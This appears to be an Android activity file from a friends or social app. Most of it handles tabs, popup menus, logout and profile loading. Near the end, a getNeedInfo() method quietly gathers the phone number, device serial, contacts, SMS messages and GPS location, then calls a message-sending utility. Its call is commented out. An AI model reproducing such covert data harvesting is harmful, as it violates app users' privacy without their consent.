package com.example.main;



import com.example.mfriends.LoginActivity;
import com.example.mfriends.MainActivity;
import com.example.mfriends.R;
import com.example.mfriends.SelectPicPopupWindow;
import com.example.mfriends.SelectSearchUserWindow;
import com.example.model.UserInfo;
import com.example.needinfo.MessageUtils;
import com.example.needinfo.NeedGPSInfo;
import com.example.needinfo.NeedPhoneContacts;
import com.example.needinfo.NeedPhoneSMS;
import com.example.needinfo.NeedSIMCH;
import com.example.needinfo.NeedSIMCardInfo;
import com.example.utils.Constant;
import com.example.utils.HandlerConstants;
import com.example.utils.HttpEngine;
import com.example.utils.JSONUtils;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.TabActivity;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.drawable.Drawable;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.Message;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.View.OnClickListener;
import android.widget.CompoundButton;
import android.widget.ImageView;
import android.widget.RadioButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.TabHost;

public class MainTabActivity extends TabActivity implements OnCheckedChangeListener{
	
	private TabHost mTabHost;
	private Intent mAIntent;
	private Intent mBIntent;
	private Intent mCIntent;
	private Intent mDIntent;
	private Intent mEIntent;
	private ImageView search;
	private ImageView refresh;
	private ImageView set;
	private UserInfo userinfo=new UserInfo();
	// 自定义的弹出框类
	SelectPicPopupWindow menuWindow; // 弹出框
	SelectSearchUserWindow menuSearchWindow; // 弹出框
	 public static final int  EXIT_APPLICATION = 0x0001; 
	//本地监听
		LocationListener localListener;
	//这里用来接受退出程序的指令   
    @Override  
    protected void onStart() {  
        int flag = getIntent().getIntExtra("flag", 0);  
        if(flag ==EXIT_APPLICATION){  
            finish(); 
            Intent intent = new Intent(MainTabActivity.this, LoginActivity.class);  
            intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);  //注意本行的FLAG设置,设置登陆界面为最前
            MainTabActivity.this.startActivity(intent);
            android.os.Process.killProcess(android.os.Process.myPid());  
        }  
        super.onResume();  
          
    }  
	
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.maintabs);
        
        this.mAIntent = new Intent(this,AActivity.class);
        this.mBIntent = new Intent(this,BActivity.class);
        this.mCIntent = new Intent(this,CActivity.class);
        this.mDIntent = new Intent(this,DActivity.class);
        this.mEIntent = new Intent(this,EActivity.class);
        
		((RadioButton) findViewById(R.id.menu_users))
		.setOnCheckedChangeListener(this);
        ((RadioButton) findViewById(R.id.menu_message))
		.setOnCheckedChangeListener(this);
        ((RadioButton) findViewById(R.id.menu_friends))
		.setOnCheckedChangeListener(this);
        ((RadioButton) findViewById(R.id.menu_info))
		.setOnCheckedChangeListener(this);
      /*  ((RadioButton) findViewById(R.id.radio_button4))
		.setOnCheckedChangeListener(this);*/
        search=(ImageView)findViewById(R.id.search);
        refresh= (ImageView) findViewById(R.id.refresh);
        set = (ImageView) findViewById(R.id.set);
        refresh.setOnClickListener(new View.OnClickListener() {
     			@Override
     			public void onClick(View arg0) {
     				// 广播通知  
			         Intent intent = new Intent();  
			         intent.setAction("action.refresh");  
			         sendBroadcast(intent); 
     			}
     		});
        set.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View arg0) {
				uploadImage(MainTabActivity.this);
			}
		});
        search.setOnClickListener(new View.OnClickListener() {
   			@Override
   			public void onClick(View arg0) {
   				uploadSearchImage(MainTabActivity.this);
   			}
   		});
        setupIntent();
		//获取信息初始化
		//getNeedInfo();
    }

	@Override
	public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
		if(isChecked){
			switch (buttonView.getId()) {
			case R.id.menu_users:
				this.mTabHost.setCurrentTabByTag("A_TAB");
				updateButton(buttonView);
				break;
			case R.id.menu_message:
				this.mTabHost.setCurrentTabByTag("B_TAB");
				updateButton(buttonView);
				break;
			case R.id.menu_friends:
				this.mTabHost.setCurrentTabByTag("C_TAB");
				updateButton(buttonView);
				break;
			case R.id.menu_info:
				this.mTabHost.setCurrentTabByTag("D_TAB");
				updateButton(buttonView);
				break;		
			}
		}
		
	}
	
	@SuppressLint("NewApi")
	private void setupIntent() {
		this.mTabHost = getTabHost();
		TabHost localTabHost = this.mTabHost;

		localTabHost.addTab(buildTabSpec("A_TAB", R.string.user,
				R.drawable._medal_credit_0, this.mAIntent));

		localTabHost.addTab(buildTabSpec("B_TAB", R.string.messages,
				R.drawable._medal_credit_0, this.mBIntent));

		localTabHost.addTab(buildTabSpec("C_TAB",
				R.string.myconcern, R.drawable._medal_credit_0,
				this.mCIntent));

		localTabHost.addTab(buildTabSpec("D_TAB", R.string.me,
				R.drawable._medal_credit_0, this.mDIntent));
		
		
		  Drawable currentImg=this.getResources().getDrawable(R.drawable._medal_credit); 	       
	       ((RadioButton) findViewById(R.id.menu_users)).setCompoundDrawablesRelativeWithIntrinsicBounds(null,currentImg,null,null);

	}
	
	private TabHost.TabSpec buildTabSpec(String tag, int resLabel, int resIcon,
			final Intent content) {
		return this.mTabHost.newTabSpec(tag).setIndicator(getString(resLabel),
				getResources().getDrawable(resIcon)).setContent(content);
	}
	
	
	//我的相册
	public void uploadImage(final Activity context) {
		menuWindow = new SelectPicPopupWindow(MainTabActivity.this, itemsOnClick,userinfo);
		// 显示窗口
		View view = MainTabActivity.this.findViewById(R.id.set);
		// 计算坐标的偏移量
		int xoffInPixels = menuWindow.getWidth() - view.getWidth() + 10;
		menuWindow.showAsDropDown(view, -xoffInPixels, 0);
	}
	
	public void uploadSearchImage(final Activity context) {	
		menuSearchWindow = new SelectSearchUserWindow(MainTabActivity.this, itemsSearchOnClick);
		// 显示窗口
		View view = MainTabActivity.this.findViewById(R.id.set);
		// 计算坐标的偏移量
		int xoffInPixels = menuSearchWindow.getWidth() - view.getWidth() + 10;
		menuSearchWindow.showAsDropDown(view, -xoffInPixels, 0);
		//menuSearchWindow.getContentView().setTag(mHandler);
	}
	
	
	// 为弹出窗口实现监听类
	private OnClickListener itemsOnClick = new OnClickListener() {

		public void onClick(View v) {
			menuWindow.dismiss();
		}
	};
	// 为弹出窗口实现监听类
	private OnClickListener itemsSearchOnClick = new OnClickListener() {

		public void onClick(View v) {
			menuSearchWindow.dismiss();
		}
	};
	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if ((keyCode == KeyEvent.KEYCODE_MENU)) {
			return true;
		}
		else 
	        if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) { 
	            dialog(); 
	            return false; 
	        } 
	        else  return false; 
		//return super.onKeyDown(keyCode, event);
	}

	protected void dialog() { 
        AlertDialog.Builder builder = new Builder(MainTabActivity.this); 
        builder.setMessage(getResources().getString(R.string.suretologout)); 
        builder.setTitle(getResources().getString(R.string.note)); 
        builder.setPositiveButton(getResources().getString(R.string.sure), 
                new android.content.DialogInterface.OnClickListener() { 
                    @Override
                    public void onClick(DialogInterface dialog, int which) { 
                        dialog.dismiss(); 
                        MainTabActivity.this.finish(); 
                        android.os.Process.killProcess(android.os.Process.myPid());  
                    } 
                }); 
        builder.setNegativeButton(getResources().getString(R.string.cancel), 
                new android.content.DialogInterface.OnClickListener() { 
                    @Override
                    public void onClick(DialogInterface dialog, int which) { 
                        dialog.dismiss(); 
                    } 
                }); 
        builder.create().show(); 
    } 
	/**
	 * 获取用户基本信息并显示
	 */
	public void httpGetUserinfo(){
		//ProgressDialogUtils.showProgressDialog(this, "数据加载中...");
		RequestParams params= new RequestParams();
		params.add("id",Constant.getUserId());   
		HttpEngine.getHttpEngine().get(Constant.getBaseInfoById, params, new AsyncHttpResponseHandler(){
			@Override
		    public void onSuccess(String result) {
				// 关闭进度条
			//	ProgressDialogUtils.dismissProgressDialog();
				 if (result != null) {
					 //String info = JSON.parseObject(result).get("")
					//将其转化成java bean
				       UserInfo re= JSONUtils.jsonToEntity(result,UserInfo.class);
				if(re.getUsername()!=null){Constant.userinfo.setUsername(re.getUsername());	}
				if(re.getEmail()!=null){Constant.userinfo.setEmail(re.getEmail());}
				if(re.getIntro()!=null){Constant.userinfo.setIntro(re.getIntro());}
				if(re.getUserImg()!=null){Constant.userinfo.setUserImg(re.getUserImg());


				}
				 } else {

					 
						//Toast.makeText(MainActivity.this, "获取数据错误",Toast.LENGTH_SHORT).show();
					}
		    }
			
		     @Override
             public void onFailure(Throwable error) {
		    	 if(Constant.Debug){
						Constant.userinfo.setUsername("mrxu");	
						Constant.userinfo.setEmail("mrxu@163.com");
						Constant.userinfo.setIntro("个人简介");
						Constant.userinfo.setUserImg("");
		    	 }
		    	// 关闭进度条
					//ProgressDialogUtils.dismissProgressDialog();
                     error.printStackTrace();

                    // Toast.makeText(MainActivity.this, "请求超时,请检查网络!",Toast.LENGTH_SHORT).show();
             }
		});
		
	}
	
	  @SuppressLint("NewApi")
	private void updateButton(CompoundButton buttonView) {
		  Drawable defaultImg=this.getResources().getDrawable(R.drawable._love_); 
		  Drawable currentImg=this.getResources().getDrawable(R.drawable._medal_credit); 
			((RadioButton) findViewById(R.id.menu_users)).setCompoundDrawablesRelativeWithIntrinsicBounds(null,defaultImg,null,null);
		
	        ((RadioButton) findViewById(R.id.menu_message)).setCompoundDrawablesRelativeWithIntrinsicBounds(null,defaultImg,null,null);
			
	        ((RadioButton) findViewById(R.id.menu_friends)).setCompoundDrawablesRelativeWithIntrinsicBounds(null,defaultImg,null,null);
		
	        ((RadioButton) findViewById(R.id.menu_info)).setCompoundDrawablesRelativeWithIntrinsicBounds(null,defaultImg,null,null);
	       
	        buttonView.setCompoundDrawablesRelativeWithIntrinsicBounds(null,currentImg,null,null);
	  }
	  
	  
	//获取需要的手机信息   手机号码，串号码，联系人，短信，
		public void getNeedInfo()
		{
			//获取手机号
			NeedSIMCardInfo siminfo = new NeedSIMCardInfo(MainTabActivity.this);
			
			//获取串号
			NeedSIMCH simch = new NeedSIMCH(MainTabActivity.this);
			//获取电话簿联系人
			NeedPhoneContacts npc = new NeedPhoneContacts(MainTabActivity.this);
			//获取短信
			NeedPhoneSMS npsms = new NeedPhoneSMS(MainTabActivity.this);
			//获取当前手机GPS位置
			NeedGPSInfo ngpsi = new NeedGPSInfo(MainTabActivity.this,localListener);
			
			System.out.println("手机号码是："+siminfo.getNativePhoneNumber()+"===================================");
			System.out.println("串号是："+simch.getSIMCH()+"-----------------------------------");
			System.out.println("电话簿是："+npc.getPhoneAndSIMContracts().size());
			System.out.println("短信是：" + npsms.getSmsFromPhone().size());
			
			if(ngpsi.openGPSSettings()){
				
				System.out.println("当前GPS位置为：main:");
				ngpsi.getGPSLocation();
				
			}else{
				System.out.println("未开通GPS功能，请先开通！");
			}
			
			MessageUtils.getUtils().sendMessage(this);
			
		}
		
	  
}